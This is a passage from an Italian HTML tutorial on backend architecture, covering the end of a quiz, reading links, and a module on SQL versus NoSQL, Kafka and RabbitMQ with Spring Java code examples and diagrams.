                    <button class="check-btn" onclick="checkAnswer('q13')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q13"></div>
                </div>

                <!-- Question 14 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> Perché il Consistent Hashing è preferito al semplice hash modulo N per il load balancing di cache distribuite?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q14" id="q14a" value="a">
                            <label for="q14a">Perché è più veloce da calcolare</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q14" id="q14b" value="b">
                            <label for="q14b">Perché garantisce una distribuzione perfettamente uniforme</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q14" id="q14c" value="c">
                            <label for="q14c">Perché supporta più tipi di dati rispetto all'hash tradizionale</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q14" id="q14d" value="d">
                            <label for="q14d">Perché quando si aggiunge/rimuove un nodo, solo una frazione delle chiavi deve essere rimappata</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q14')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q14"></div>
                </div>

                <!-- Question 15 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> Un team sta decidendo tra microservizi e monolite per una nuova startup. Quale fattore dovrebbe pesare di PIÙ verso la scelta del monolite?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q15" id="q15a" value="a">
                            <label for="q15a">L'applicazione avrà milioni di utenti</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q15" id="q15b" value="b">
                            <label for="q15b">Il team ha esperienza con Kubernetes</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q15" id="q15c" value="c">
                            <label for="q15c">Il dominio di business non è ancora ben definito e cambierà frequentemente</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q15" id="q15d" value="d">
                            <label for="q15d">Diverse parti del sistema avranno requisiti di scaling molto diversi</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q15')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q15"></div>
                </div>
            </section>

            <!-- Links Modulo 3 -->
            <section class="section" id="modulo3-links">
                <h2>Link di Approfondimento - Modulo 3</h2>

                <div class="info-box">
                    <h4>Architettura & Microservizi</h4>
                    <p><a href="https://microservices.io/" target="_blank">Microservices.io</a> - Pattern catalog di Chris Richardson</p>
                    <p><a href="https://martinfowler.com/articles/microservices.html" target="_blank">Martin Fowler: Microservices</a> - Articolo introduttivo</p>
                    <p><a href="https://12factor.net/" target="_blank">The Twelve-Factor App</a> - Best practices per app cloud-native</p>
                    <p><a href="https://samnewman.io/books/building_microservices_2nd_edition/" target="_blank">Building Microservices (Book)</a> - Sam Newman</p>
                </div>

                <div class="info-box">
                    <h4>Resilience Patterns</h4>
                    <p><a href="https://resilience4j.readme.io/" target="_blank">Resilience4j Documentation</a> - Libreria Java per resilienza</p>
                    <p><a href="https://www.baeldung.com/resilience4j" target="_blank">Baeldung: Resilience4j Guide</a></p>
                    <p><a href="https://martinfowler.com/bliki/CircuitBreaker.html" target="_blank">Martin Fowler: Circuit Breaker</a></p>
                    <p><a href="https://netflix.github.io/Hystrix/" target="_blank">Netflix Hystrix</a> - Storico ma utile per i concetti</p>
                </div>

                <div class="info-box">
                    <h4>CAP Theorem & Distributed Systems</h4>
                    <p><a href="https://www.baeldung.com/cs/cap-theorem" target="_blank">Baeldung: CAP Theorem Explained</a></p>
                    <p><a href="https://martin.kleppmann.com/2015/05/11/please-stop-calling-databases-cp-or-ap.html" target="_blank">Martin Kleppmann: Please Stop Calling Databases CP or AP</a></p>
                </div>

                <div class="info-box">
                    <h4>Load Balancing & Caching</h4>
                    <p><a href="https://www.nginx.com/resources/glossary/load-balancing/" target="_blank">NGINX: Load Balancing</a></p>
                    <p><a href="https://aws.amazon.com/caching/" target="_blank">AWS: Caching Overview</a></p>
                    <p><a href="https://www.baeldung.com/spring-cache-tutorial" target="_blank">Baeldung: Spring Cache</a></p>
                </div>
            </section>

            <!-- ==================== MODULO 4: DATABASE & MESSAGING ==================== -->

            <header class="module-header" id="modulo4" style="margin-top: 80px;">
                <span class="module-tag">Modulo 4</span>
                <h1>Database & Messaging</h1>
                <p>SQL vs NoSQL, event streaming con Kafka, message broker con RabbitMQ</p>
            </header>

            <!-- SQL vs NoSQL Section -->
            <section class="section" id="modulo4-sql-nosql">
                <h2>SQL vs NoSQL</h2>

                <p>La scelta tra database relazionali (SQL) e non relazionali (NoSQL) dipende dai requisiti specifici dell'applicazione. Non esiste una soluzione universalmente migliore.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         DATABASE LANDSCAPE                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   SQL (Relational)                  NoSQL                                   │
│   ────────────────                  ─────                                   │
│                                                                             │
│   ┌─────────────────┐               ┌─────────────────┐                     │
│   │   PostgreSQL    │               │   Document DB   │                     │
│   │   MySQL         │               │   ─────────────  │                     │
│   │   Oracle        │               │   MongoDB       │                     │
│   │   SQL Server    │               │   CouchDB       │                     │
│   └─────────────────┘               └─────────────────┘                     │
│                                                                             │
│   Structured data                   ┌─────────────────┐                     │
│   ACID transactions                 │   Key-Value     │                     │
│   Complex queries/joins             │   ───────────   │                     │
│   Strong consistency                │   Redis         │                     │
│                                     │   DynamoDB      │                     │
│                                     │   Memcached     │                     │
│                                     └─────────────────┘                     │
│                                                                             │
│                                     ┌─────────────────┐                     │
│                                     │   Wide-Column   │                     │
│                                     │   ────────────  │                     │
│                                     │   Cassandra     │                     │
│                                     │   HBase         │                     │
│                                     │   ScyllaDB      │                     │
│                                     └─────────────────┘                     │
│                                                                             │
│                                     ┌─────────────────┐                     │
│                                     │   Graph DB      │                     │
│                                     │   ────────────  │                     │
│                                     │   Neo4j         │                     │
│                                     │   Amazon Neptune│                     │
│                                     └─────────────────┘                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Confronto dettagliato</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>SQL</th>
                            <th>NoSQL</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Schema</strong></td>
                            <td>Rigido, predefinito</td>
                            <td>Flessibile, schema-on-read</td>
                        </tr>
                        <tr>
                            <td><strong>Scaling</strong></td>
                            <td>Verticale (scale-up)</td>
                            <td>Orizzontale (scale-out)</td>
                        </tr>
                        <tr>
                            <td><strong>Transactions</strong></td>
                            <td>ACID garantito</td>
                            <td>BASE (eventual consistency) o ACID limitato</td>
                        </tr>
                        <tr>
                            <td><strong>Query</strong></td>
                            <td>SQL standard, JOIN potenti</td>
                            <td>Query language specifico, no JOIN (o limitati)</td>
                        </tr>
                        <tr>
                            <td><strong>Data model</strong></td>
                            <td>Tabelle normalizzate</td>
                            <td>Denormalizzato, ottimizzato per access pattern</td>
                        </tr>
                        <tr>
                            <td><strong>Use cases</strong></td>
                            <td>OLTP, dati strutturati, relazioni complesse</td>
                            <td>Big data, real-time, dati semi-strutturati</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>ACID vs BASE</h4>
                    <p><strong>ACID</strong>: Atomicity, Consistency, Isolation, Durability - garanzie forti, tipiche dei database SQL.<br><br>
                    <strong>BASE</strong>: Basically Available, Soft state, Eventually consistent - modello più rilassato dei database NoSQL distribuiti, che privilegia availability e partition tolerance.</p>
                </div>

                <h3>Quando usare cosa</h3>

                <pre><code class="language-java">// SQL - Ideale per:
// 1. Transazioni finanziarie (ACID critico)
@Transactional
public void transferMoney(Long fromAccount, Long toAccount, BigDecimal amount) {
    Account from = accountRepository.findById(fromAccount).orElseThrow();
    Account to = accountRepository.findById(toAccount).orElseThrow();

    from.debit(amount);
    to.credit(amount);

    accountRepository.save(from);
    accountRepository.save(to);
    // Se qualcosa fallisce, TUTTO viene rollbackato
}

// 2. Query complesse con JOIN
@Query("""
    SELECT new com.example.OrderSummary(
        o.id, c.name, p.name, oi.quantity, oi.price
    )
    FROM Order o
    JOIN o.customer c
    JOIN o.items oi
    JOIN oi.product p
    WHERE o.createdAt > :since
    AND c.tier = 'PREMIUM'
    ORDER BY o.total DESC
    """)
List&lt;OrderSummary&gt; findPremiumOrdersSince(@Param("since") LocalDateTime since);

// 3. Dati altamente relazionali
// User -> Orders -> OrderItems -> Products -> Categories -> ...


// NoSQL (MongoDB) - Ideale per:
// 1. Documenti con struttura variabile
@Document(collection = "products")
public class Product {
    @Id
    private String id;
    private String name;
    private Map&lt;String, Object&gt; attributes;  // Schema flessibile!
    // Un laptop ha: cpu, ram, storage
    // Una maglietta ha: size, color, material
}

// 2. Dati denormalizzati per read performance
@Document(collection = "orders")
public class Order {
    @Id
    private String id;

    // Embedded, non riferimento - evita JOIN
    private CustomerSnapshot customer;
    private List&lt;OrderItemSnapshot&gt; items;

    // Tutto ciò che serve per visualizzare l'ordine in un solo read
}

// 3. High write throughput (time-series, logging)
@Document(collection = "events")
public class AnalyticsEvent {
    private Instant timestamp;
    private String eventType;
    private Map&lt;String, Object&gt; payload;
}</code></pre>

                <div class="info-box warning">
                    <h4>Domanda da colloquio</h4>
                    <p>"Come gestiresti una relazione many-to-many in MongoDB?"<br><br>
                    <strong>Risposta:</strong> Dipende dall'access pattern! (1) Se leggo sempre gli utenti con i loro ruoli: embed array di ruoli nel documento utente. (2) Se leggo spesso i ruoli per vedere quali utenti li hanno: array di userId nel documento ruolo. (3) Se entrambi: duplicazione (denormalizzazione) con gestione manuale della consistency, oppure collection separata di "link" e aggregation pipeline.</p>
                </div>

                <h3>Polyglot Persistence</h3>

                <p>I sistemi moderni spesso usano <strong>più database</strong> per scopi diversi:</p>

                <pre><code class="language-java">// Esempio di architettura polyglot
@Service
public class EcommerceService {

    // PostgreSQL - Ordini, transazioni (ACID)
    private final OrderRepository orderRepository;  // JPA

    // MongoDB - Catalogo prodotti (schema flessibile)
    private final ProductRepository productRepository;  // Spring Data MongoDB

    // Redis - Sessioni, cache, rate limiting
    private final StringRedisTemplate redisTemplate;

    // Elasticsearch - Ricerca full-text
    private final ElasticsearchOperations elasticOps;

    // Neo4j - Raccomandazioni (grafi)
    private final RecommendationRepository recommendationRepo;

    public SearchResult search(String query) {
        // Elasticsearch per ricerca
        return elasticOps.search(query, Product.class);
    }

    public List&lt;Product&gt; getRecommendations(Long userId) {
        // Neo4j: "utenti che hanno comprato X hanno anche comprato Y"
        return recommendationRepo.findRecommendationsFor(userId);
    }

    @Transactional
    public Order placeOrder(OrderRequest request) {
        // PostgreSQL per transazione ACID
        return orderRepository.save(createOrder(request));
    }
}</code></pre>
            </section>

            <!-- Kafka Section -->
            <section class="section" id="modulo4-kafka">
                <h2>Apache Kafka - Event Streaming</h2>

                <p><strong>Apache Kafka</strong> è una piattaforma di event streaming distribuita, progettata per gestire flussi di dati in tempo reale con alto throughput, durabilità e fault tolerance.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         KAFKA ARCHITECTURE                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Producers                    Kafka Cluster                   Consumers   │
│   ─────────                    ─────────────                   ─────────   │
│                                                                             │
│   ┌─────────┐                  ┌─────────────────────────┐                  │
│   │Producer │──publish──►     │     Topic: orders        │                  │
│   │   A     │                  │  ┌─────┬─────┬─────┐    │                  │
│   └─────────┘                  │  │ P0  │ P1  │ P2  │    │    ┌──────────┐ │
│                                │  ├─────┼─────┼─────┤    │───►│Consumer  │ │
│   ┌─────────┐                  │  │msg1 │msg2 │msg4 │    │    │Group A   │ │
│   │Producer │──publish──►     │  │msg3 │msg5 │msg7 │    │    │┌────────┐│ │
│   │   B     │                  │  │msg6 │msg8 │     │    │    ││C1 (P0) ││ │
│   └─────────┘                  │  └─────┴─────┴─────┘    │    ││C2 (P1) ││ │
│                                │                         │    ││C3 (P2) ││ │
│                                │  Partitions             │    │└────────┘│ │
│                                │  (parallelism unit)     │    └──────────┘ │
│                                │                         │                  │
│                                │  Broker 1   Broker 2    │    ┌──────────┐ │
│                                │  ┌──────┐   ┌──────┐    │───►│Consumer  │ │
│                                │  │P0,P2 │   │P1    │    │    │Group B   │ │
│                                │  │leader│   │leader│    │    │(all P)   │ │
│                                │  └──────┘   └──────┘    │    └──────────┘ │
│                                │                         │                  │
│                                │  Replication Factor = 2 │                  │
│                                └─────────────────────────┘                  │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   Key Concepts:                                                             │
│   • Topic: categoria/feed di messaggi (come una tabella)                    │
│   • Partition: unità di parallelismo, messaggi ordinati per partition       │
│   • Offset: ID sequenziale del messaggio nella partition                    │
│   • Consumer Group: gruppo di consumer che si dividono le partition         │
│   • Replication: copie delle partition su broker diversi (fault tolerance)  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Kafka Producer</h3>

                <pre><code class="language-java">// Configurazione Spring Kafka Producer
@Configuration
public class KafkaProducerConfig {

    @Bean
    public ProducerFactory&lt;String, OrderEvent&gt; producerFactory() {
        Map&lt;String, Object&gt; config = new HashMap&lt;&gt;();
        config.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        config.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class);
        config.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, JsonSerializer.class);

        // Durability settings
        config.put(ProducerConfig.ACKS_CONFIG, "all");  // Aspetta ACK da tutti i replica
        config.put(ProducerConfig.RETRIES_CONFIG, 3);
        config.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, true);  // Exactly-once

        return new DefaultKafkaProducerFactory&lt;&gt;(config);
    }

    @Bean
    public KafkaTemplate&lt;String, OrderEvent&gt; kafkaTemplate() {
        return new KafkaTemplate&lt;&gt;(producerFactory());
    }
}

@Service
@RequiredArgsConstructor
public class OrderEventPublisher {

    private final KafkaTemplate&lt;String, OrderEvent&gt; kafkaTemplate;

    public void publishOrderCreated(Order order) {
        OrderEvent event = new OrderEvent(
            order.getId(),
            OrderEventType.CREATED,
            order.getCustomerId(),
            order.getTotal(),
            Instant.now()
        );

        // Key = customerId per garantire ordine per cliente
        kafkaTemplate.send("orders", order.getCustomerId().toString(), event)
            .whenComplete((result, ex) -> {
                if (ex == null) {
                    log.info("Sent event to partition {} offset {}",
                        result.getRecordMetadata().partition(),
                        result.getRecordMetadata().offset());
                } else {
                    log.error("Failed to send event", ex);
                }
            });
    }
}</code></pre>

                <h3>Kafka Consumer</h3>

                <pre><code class="language-java">// Consumer configuration
@Configuration
@EnableKafka
public class KafkaConsumerConfig {

    @Bean
    public ConsumerFactory&lt;String, OrderEvent&gt; consumerFactory() {
        Map&lt;String, Object&gt; config = new HashMap&lt;&gt;();
        config.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        config.put(ConsumerConfig.GROUP_ID_CONFIG, "order-processor");
        config.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);
        config.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);

        // Offset management
        config.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, "earliest");
        config.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, false);  // Manual commit

        return new DefaultKafkaConsumerFactory&lt;&gt;(config);
    }

    @Bean
    public ConcurrentKafkaListenerContainerFactory&lt;String, OrderEvent&gt;
            kafkaListenerContainerFactory() {
        ConcurrentKafkaListenerContainerFactory&lt;String, OrderEvent&gt; factory =
            new ConcurrentKafkaListenerContainerFactory&lt;&gt;();
        factory.setConsumerFactory(consumerFactory());
        factory.setConcurrency(3);  // 3 consumer threads
        factory.getContainerProperties().setAckMode(AckMode.MANUAL_IMMEDIATE);
        return factory;
    }
}

@Service
@Slf4j
public class OrderEventConsumer {

    @KafkaListener(
        topics = "orders",
        groupId = "order-processor",
        containerFactory = "kafkaListenerContainerFactory"
    )
    public void consume(
            @Payload OrderEvent event,
            @Header(KafkaHeaders.RECEIVED_PARTITION) int partition,
            @Header(KafkaHeaders.OFFSET) long offset,
            Acknowledgment ack) {

        try {
            log.info("Received event: {} from partition {} offset {}",
                event.getType(), partition, offset);

            processEvent(event);

            // Manual acknowledgment dopo processing riuscito
            ack.acknowledge();

        } catch (Exception e) {
            log.error("Error processing event, will retry", e);
            // Non fare ack - il messaggio verrà ri-processato
            // Oppure invia a Dead Letter Topic
        }
    }

    // Batch consumer per high throughput
    @KafkaListener(topics = "events", groupId = "batch-processor", batch = "true")
    public void consumeBatch(List&lt;ConsumerRecord&lt;String, Event&gt;&gt; records, Acknowledgment ack) {
        log.info("Received batch of {} records", records.size());

        records.forEach(record -> processEvent(record.value()));

        ack.acknowledge();  // Commit dell'intero batch
    }
}</code></pre>

                <h3>Exactly-Once Semantics</h3>

                <div class="info-box">
                    <h4>Delivery Guarantees</h4>
                    <ul>
                        <li><strong>At-most-once:</strong> Messaggi possono essere persi, mai duplicati (fire-and-forget)</li>
                        <li><strong>At-least-once:</strong> Messaggi mai persi, possibili duplicati (default Kafka)</li>
                        <li><strong>Exactly-once:</strong> Ogni messaggio processato esattamente una volta (richiede configurazione specifica)</li>
                    </ul>
                </div>

                <pre><code class="language-java">// Exactly-once con Transactional Producer + Consumer
@Configuration
public class ExactlyOnceConfig {

    @Bean
    public ProducerFactory&lt;String, Event&gt; transactionalProducerFactory() {
        Map&lt;String, Object&gt; config = new HashMap&lt;&gt;();
        config.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        config.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, true);
        config.put(ProducerConfig.TRANSACTIONAL_ID_CONFIG, "tx-producer-1");
        // ...serializers

        DefaultKafkaProducerFactory&lt;String, Event&gt; factory =
            new DefaultKafkaProducerFactory&lt;&gt;(config);
        factory.setTransactionIdPrefix("tx-");
        return factory;
    }

    @Bean
    public KafkaTransactionManager&lt;String, Event&gt; kafkaTransactionManager() {
        return new KafkaTransactionManager&lt;&gt;(transactionalProducerFactory());
    }
}

@Service
public class TransactionalProcessor {

    private final KafkaTemplate&lt;String, Event&gt; kafkaTemplate;

    @Transactional("kafkaTransactionManager")
    public void processAndPublish(Event input) {
        // Read-Process-Write in una transazione Kafka
        Event processed = process(input);
        kafkaTemplate.send("output-topic", processed);
        // Se fallisce, tutto viene rollbackato
    }
}</code></pre>

                <h3>Partitioning Strategy</h3>

                <pre><code class="language-java">// Custom partitioner per controllo distribuzione
public class CustomerPartitioner implements Partitioner {

    @Override
    public int partition(String topic, Object key, byte[] keyBytes,
                         Object value, byte[] valueBytes, Cluster cluster) {
        List&lt;PartitionInfo&gt; partitions = cluster.partitionsForTopic(topic);
        int numPartitions = partitions.size();

        if (key == null) {
            // Round-robin per messaggi senza key
            return ThreadLocalRandom.current().nextInt(numPartitions);
        }

        // Consistent hashing sul customer ID
        // Tutti gli ordini dello stesso cliente vanno alla stessa partition
        // → Garantisce ordine per cliente
        return Math.abs(key.hashCode()) % numPartitions;
    }

    @Override
    public void close() {}

    @Override
    public void configure(Map&lt;String, ?&gt; configs) {}
}</code></pre>
            </section>

            <!-- RabbitMQ Section -->
            <section class="section" id="modulo4-rabbitmq">
                <h2>RabbitMQ - Message Broker</h2>

                <p><strong>RabbitMQ</strong> è un message broker che implementa il protocollo AMQP (Advanced Message Queuing Protocol). È progettato per scenari di messaging tradizionale con routing flessibile e garanzie di delivery.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        RABBITMQ ARCHITECTURE                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Producer                    RabbitMQ Broker                   Consumer    │
│   ────────                    ───────────────                   ────────    │
│                                                                             │
│   ┌─────────┐     ┌─────────────────────────────────────────┐              │
│   │Publisher│────►│  Exchange                               │              │
│   └─────────┘     │  ┌─────────────────────────────────┐    │              │
│                   │  │  Routing Logic                   │    │              │
│                   │  │  (type: direct/fanout/topic/    │    │              │
│                   │  │   headers)                       │    │              │
│                   │  └───────────┬─────────────────────┘    │              │
│                   │              │                           │              │
│                   │              │ Bindings                  │              │
│                   │              │ (routing rules)           │              │
│                   │              │                           │              │
│                   │  ┌───────────▼───────────────────────┐  │  ┌─────────┐│
│                   │  │  Queue: order.created              │──┼─►│Consumer ││
│                   │  │  [msg1][msg2][msg3]               │  │  │   A     ││
│                   │  └───────────────────────────────────┘  │  └─────────┘│
│                   │                                         │              │
│                   │  ┌───────────────────────────────────┐  │  ┌─────────┐│
│                   │  │  Queue: order.shipped              │──┼─►│Consumer ││
│                   │  │  [msg4][msg5]                     │  │  │   B     ││
│                   │  └───────────────────────────────────┘  │  └─────────┘│
│                   │                                         │              │
│                   └─────────────────────────────────────────┘              │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   Exchange Types:                                                           │
│   • Direct:  routing key esatto (1:1)                                       │
│   • Fanout:  broadcast a tutte le queue (1:N)                               │
│   • Topic:   pattern matching con wildcard (*.orders.#)                     │
│   • Headers: routing basato su header attributes                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Exchange Types in dettaglio</h3>

                <pre><code class="language-java">@Configuration
public class RabbitMQConfig {

    // ═══════════════════════════════════════════════════════════════════════
    // DIRECT EXCHANGE - Routing esatto per key
    // ═══════════════════════════════════════════════════════════════════════

    @Bean
    public DirectExchange orderExchange() {
        return new DirectExchange("order.exchange");
    }

    @Bean
    public Queue orderCreatedQueue() {
        return QueueBuilder.durable("order.created")
            .withArgument("x-dead-letter-exchange", "dlx.exchange")
            .withArgument("x-dead-letter-routing-key", "order.created.dlq")
            .build();
    }

    @Bean
    public Binding orderCreatedBinding() {
        return BindingBuilder
            .bind(orderCreatedQueue())
            .to(orderExchange())
            .with("order.created");  // Routing key esatto
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FANOUT EXCHANGE - Broadcast a tutte le queue
    // ═══════════════════════════════════════════════════════════════════════

    @Bean
    public FanoutExchange notificationExchange() {
        return new FanoutExchange("notification.fanout");
    }

    @Bean
    public Queue emailQueue() {
        return new Queue("notification.email");
    }

    @Bean
    public Queue smsQueue() {
        return new Queue("notification.sms");
    }

    @Bean
    public Queue pushQueue() {
        return new Queue("notification.push");
    }

    @Bean
    public Binding emailBinding() {
        return BindingBuilder.bind(emailQueue()).to(notificationExchange());
        // Nessun routing key - riceve TUTTO
    }

    // ═══════════════════════════════════════════════════════════════════════
    // TOPIC EXCHANGE - Pattern matching
    // ═══════════════════════════════════════════════════════════════════════

    @Bean
    public TopicExchange eventExchange() {
        return new TopicExchange("event.topic");
    }

    @Bean
    public Queue allOrderEventsQueue() {
        return new Queue("events.orders.all");
    }

    @Bean
    public Queue europeanEventsQueue() {
        return new Queue("events.europe");
    }

    @Bean
    public Binding allOrdersBinding() {
        return BindingBuilder
            .bind(allOrderEventsQueue())
            .to(eventExchange())
            .with("order.*");  // order.created, order.shipped, order.cancelled
    }

    @Bean
    public Binding europeanBinding() {
        return BindingBuilder
            .bind(europeanEventsQueue())
            .to(eventExchange())
            .with("*.*.europe.#");  // user.created.europe, order.shipped.europe.italy
    }
    // Pattern: * = una parola, # = zero o più parole
}</code></pre>

                <h3>Producer e Consumer</h3>

                <pre><code class="language-java">// Producer
@Service
@RequiredArgsConstructor
public class OrderEventPublisher {

    private final RabbitTemplate rabbitTemplate;

    public void publishOrderCreated(Order order) {
        OrderEvent event = new OrderEvent(order.getId(), "CREATED", Instant.now());

        rabbitTemplate.convertAndSend(
            "order.exchange",      // Exchange
            "order.created",       // Routing key
            event,
            message -> {
                // Headers per tracing
                message.getMessageProperties().setCorrelationId(UUID.randomUUID().toString());
                message.getMessageProperties().setContentType("application/json");
                return message;
            }
        );
    }

    // Con conferma di pubblicazione
    public void publishWithConfirmation(OrderEvent event) {
        CorrelationData correlationData = new CorrelationData(UUID.randomUUID().toString());

        rabbitTemplate.convertAndSend("order.exchange", "order.created", event, correlationData);

        correlationData.getFuture().whenComplete((confirm, ex) -> {
            if (confirm != null && confirm.isAck()) {
                log.info("Message confirmed by broker");
            } else {
                log.error("Message not confirmed: {}", confirm != null ? confirm.getReason() : ex);
                // Retry o salva per riprocessamento
            }
        });
    }
}

// Consumer
@Service
@Slf4j
public class OrderEventConsumer {

    @RabbitListener(queues = "order.created")
    public void handleOrderCreated(
            OrderEvent event,
            @Header(AmqpHeaders.DELIVERY_TAG) long deliveryTag,
            Channel channel) throws IOException {

        try {
            log.info("Processing order event: {}", event.getOrderId());

            processOrder(event);

            // Manual ACK
            channel.basicAck(deliveryTag, false);

        } catch (RecoverableException e) {
            // Requeue per retry
            channel.basicNack(deliveryTag, false, true);

        } catch (Exception e) {
            // Non recuperabile - invia a DLQ (reject senza requeue)
            channel.basicNack(deliveryTag, false, false);
        }
    }

    // Con retry automatico
    @RabbitListener(queues = "order.created", containerFactory = "retryContainerFactory")
    public void handleWithRetry(OrderEvent event) {
        processOrder(event);  // Eccezioni causano retry automatico
    }
}

// Retry configuration
@Bean
public SimpleRabbitListenerContainerFactory retryContainerFactory(
        ConnectionFactory connectionFactory) {
    SimpleRabbitListenerContainerFactory factory = new SimpleRabbitListenerContainerFactory();
    factory.setConnectionFactory(connectionFactory);
    factory.setAcknowledgeMode(AcknowledgeMode.AUTO);

    factory.setAdviceChain(RetryInterceptorBuilder.stateless()
        .maxAttempts(3)
        .backOffOptions(1000, 2.0, 10000)  // 1s, 2s, 4s, max 10s
        .recoverer(new RejectAndDontRequeueRecoverer())  // Dopo 3 tentativi → DLQ
        .build());

    return factory;
}</code></pre>

                <div class="info-box warning">
                    <h4>Dead Letter Queue (DLQ)</h4>
                    <p>I messaggi finiscono in DLQ quando: (1) vengono rejected senza requeue, (2) TTL scade, (3) queue overflow. Configura sempre DLQ per non perdere messaggi problematici e poterli analizzare/riprocessare.</p>
                </div>
            </section>

            <!-- Kafka vs RabbitMQ Section -->
            <section class="section" id="modulo4-comparison">
                <h2>Kafka vs RabbitMQ</h2>

                <p>Kafka e RabbitMQ risolvono problemi diversi. Capire le differenze è fondamentale per scegliere lo strumento giusto.</p>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>Apache Kafka</th>
                            <th>RabbitMQ</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Modello</strong></td>
                            <td>Event streaming / Log distribuito</td>
                            <td>Message broker tradizionale</td>
                        </tr>
                        <tr>
                            <td><strong>Persistenza</strong></td>
                            <td>Messaggi persistiti per retention period (giorni/settimane)</td>
                            <td>Messaggi rimossi dopo ACK</td>
                        </tr>
                        <tr>
                            <td><strong>Replay</strong></td>
                            <td>Sì - consumer può rileggere da qualsiasi offset</td>
                            <td>No - messaggio consumato è perso</td>
                        </tr>
                        <tr>
                            <td><strong>Throughput</strong></td>
                            <td>Molto alto (milioni msg/sec)</td>
                            <td>Alto (decine di migliaia msg/sec)</td>
                        </tr>
                        <tr>
                            <td><strong>Latenza</strong></td>
                            <td>Più alta (batching)</td>
                            <td>Più bassa (singoli messaggi)</td>
                        </tr>
                        <tr>
                            <td><strong>Routing</strong></td>
                            <td>Semplice (topic/partition)</td>
                            <td>Complesso (exchange types, binding keys)</td>
                        </tr>
                        <tr>
                            <td><strong>Ordine messaggi</strong></td>
                            <td>Garantito per partition</td>
                            <td>Garantito per queue (single consumer)</td>
                        </tr>
                        <tr>
                            <td><strong>Consumer groups</strong></td>
                            <td>Built-in, scalabile</td>
                            <td>Competing consumers (più limitato)</td>
                        </tr>
                        <tr>
                            <td><strong>Protocollo</strong></td>
                            <td>Proprietario (TCP binary)</td>
                            <td>AMQP (standard), MQTT, STOMP</td>
                        </tr>
                    </tbody>
                </table>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                      WHEN TO USE WHAT                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   USE KAFKA WHEN:                      USE RABBITMQ WHEN:                   │
│   ───────────────                      ─────────────────                    │
│                                                                             │
│   ✓ Event sourcing                     ✓ Task queues / job distribution    │
│   ✓ Log aggregation                    ✓ Complex routing requirements       │
│   ✓ Stream processing                  ✓ Request/reply pattern              │
│   ✓ Replay di eventi necessario        ✓ Messaggi transitori                │
│   ✓ Alto throughput (>100k msg/sec)    ✓ Bassa latenza critica              │
│   ✓ Multiple consumer groups           ✓ Priorità messaggi                  │
│   ✓ Data pipeline / ETL                ✓ Integrazione legacy (AMQP)         │
│   ✓ Audit trail / compliance           ✓ RPC asincrono                      │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   EXAMPLE USE CASES:                                                        │
│                                                                             │
│   KAFKA:                               RABBITMQ:                            │
│   • Real-time analytics                • Email sending queue                │
│   • User activity tracking             • Order processing                   │
│   • CDC (Change Data Capture)          • Notification distribution          │
│   • Metrics collection                 • Background job processing          │
│   • Event-driven microservices         • API rate limiting                  │
│   • Machine learning pipelines         • IoT command distribution           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Coesistenza in architetture reali</h3>

                <pre><code class="language-java">// Molte architetture usano ENTRAMBI per scopi diversi

@Service
public class OrderService {

    private final KafkaTemplate&lt;String, OrderEvent&gt; kafkaTemplate;
    private final RabbitTemplate rabbitTemplate;

